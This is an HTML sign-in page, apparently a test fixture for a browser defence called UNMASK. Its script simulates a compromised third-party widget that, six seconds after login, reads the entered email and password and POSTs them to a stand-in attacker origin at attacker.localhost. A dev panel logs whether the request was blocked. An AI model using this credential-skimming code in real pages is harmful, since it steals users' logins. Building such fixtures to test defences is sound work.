<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Northwind Portal — Sign In</title>
<style>
  :root { color-scheme: light; }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #f4f6f8;
    color: #1a2233;
    display: flex;
    min-height: 100vh;
    align-items: center;
    justify-content: center;
  }
  .card {
    background: #fff;
    border-radius: 12px;
    box-shadow: 0 10px 40px rgba(20, 30, 50, 0.08);
    padding: 40px;
    width: 360px;
  }
  .logo { font-weight: 700; font-size: 20px; color: #1c4ed8; margin-bottom: 4px; }
  .subtitle { color: #6b7280; font-size: 13px; margin-bottom: 28px; }
  label { display: block; font-size: 13px; color: #374151; margin-bottom: 6px; margin-top: 16px; }
  input {
    width: 100%;
    padding: 10px 12px;
    border: 1px solid #d1d5db;
    border-radius: 8px;
    font-size: 14px;
  }
  input:focus { outline: 2px solid #1c4ed8; outline-offset: 1px; }
  button {
    width: 100%;
    margin-top: 24px;
    padding: 11px;
    background: #1c4ed8;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
  }
  button:hover { background: #1740b3; }
  .dashboard { display: none; }
  .dashboard h2 { font-size: 18px; margin-bottom: 4px; }
  .dashboard p { color: #6b7280; font-size: 13px; margin-top: 0; }
  .status-line {
    margin-top: 18px;
    font-size: 12px;
    color: #9ca3af;
    min-height: 16px;
  }
  .devpanel {
    margin-top: 28px;
    border-top: 1px dashed #e5e7eb;
    padding-top: 14px;
    font-family: ui-monospace, "SF Mono", Menlo, monospace;
    font-size: 11px;
    color: #6b7280;
    max-height: 140px;
    overflow-y: auto;
  }
  .devpanel-title { font-size: 10px; letter-spacing: 0.08em; color: #9ca3af; margin-bottom: 6px; }
  .devpanel div { margin-bottom: 4px; }
  .ok { color: #059669; }
  .bad { color: #dc2626; }
</style>
</head>
<body>
  <div class="card">
    <div id="login-view">
      <div class="logo">Northwind</div>
      <div class="subtitle">Sign in to your account</div>
      <form id="login-form">
        <label for="email">Email</label>
        <input id="email" type="text" value="demo@northwind.example" autocomplete="username" />
        <label for="password">Password</label>
        <input id="password" name="password" type="password" autocomplete="current-password" placeholder="Enter your password" />
        <button type="submit">Sign In</button>
      </form>
    </div>

    <div class="dashboard" id="dashboard-view">
      <h2>Welcome back 👋</h2>
      <p>Loading your dashboard…</p>
      <div class="status-line" id="status-line"></div>
    </div>

    <div class="devpanel">
      <div class="devpanel-title">DEV BUILD — NETWORK ACTIVITY</div>
      <div id="devlog">Idle.</div>
    </div>
  </div>

<script>
  // ── This page plays the role of an ordinary, trusted-looking site. ──
  // ── The "malicious" behavior below lives in the page on purpose:    ──
  // ── it simulates a compromised third-party script bundled into a   ──
  // ── real site, which is the realistic threat UNMASK defends        ──
  // ── against - not an external attacker network path.               ──
  const ATTACKER_ORIGIN = 'http://attacker.localhost:6020';
  const DELAY_SECONDS = 6;

  const devlog = document.getElementById('devlog');
  function log(msg, cls) {
    const line = document.createElement('div');
    if (cls) line.className = cls;
    line.textContent = msg;
    devlog.prepend(line);
  }

  document.getElementById('login-form').addEventListener('submit', (e) => {
    e.preventDefault();
    document.getElementById('login-view').style.display = 'none';
    document.getElementById('dashboard-view').style.display = 'block';
    log('Session started.');
    startDelayedBehavior();
  });

  function startDelayedBehavior() {
    const statusLine = document.getElementById('status-line');
    let remaining = DELAY_SECONDS;
    statusLine.textContent = `Personalizing your dashboard… (${remaining}s)`;

    const tick = setInterval(() => {
      remaining -= 1;
      if (remaining <= 0) {
        clearInterval(tick);
        statusLine.textContent = '';
        onBehaviorChange();
      } else {
        statusLine.textContent = `Personalizing your dashboard… (${remaining}s)`;
      }
    }, 1000);
  }

  async function onBehaviorChange() {
    document.getElementById('dashboard-view').querySelector('p').textContent =
      'Your dashboard is ready.';

    const password = document.getElementById('password').value;
    const email = document.getElementById('email').value;

    // Legitimate same-site call - a real "save preferences" style request.
    // This should always succeed; the Firewall only ever blocks cross-site
    // sensitive-data egress, never same-site traffic.
    fetch('/save', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ preference: 'theme', value: 'dark' })
    })
      .then(() => log('POST /save (same-site) → 200 OK', 'ok'))
      .catch((err) => log('POST /save (same-site) → error: ' + err.message, 'bad'));

    // The compromised behavior: a third-party widget bundled into this page
    // silently tries to exfiltrate the credentials just entered, to a
    // completely different origin.
    log(`Attempting POST ${ATTACKER_ORIGIN}/collect (cross-site) …`);
    try {
      await fetch(`${ATTACKER_ORIGIN}/collect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ user: email, password })
      });
      log('Cross-site request completed - NOT blocked.', 'bad');
    } catch (err) {
      log('Cross-site request failed: ' + err.message + (err.unmaskBlocked ? ' (blocked by UNMASK)' : ''), err.unmaskBlocked ? 'ok' : 'bad');
    }
  }
</script>
</body>
</html>
